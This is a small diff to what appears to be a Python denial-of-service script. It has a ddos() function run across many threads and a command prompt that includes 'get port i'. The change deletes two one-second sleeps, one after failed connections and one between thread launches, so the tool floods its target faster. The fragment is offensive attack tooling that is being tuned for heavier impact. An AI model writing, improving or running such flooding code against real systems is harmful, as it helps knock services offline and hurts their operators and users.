@@ -40,7 +40,7 @@ def ddos():
           
       except socket.error:
          print("\033[1;31;40mFailed Connection killed!, please wait....")
-         time.sleep(1)
+         
          mysocket.close()
 
    for i in range(threads):
@@ -125,7 +125,7 @@ while i < 6:
       for i in range(threads):
          t = Thread(target=ddos)
          t.start()
-         time.sleep(1)
+         
       
    elif com == 'get port i':
       print(" ")
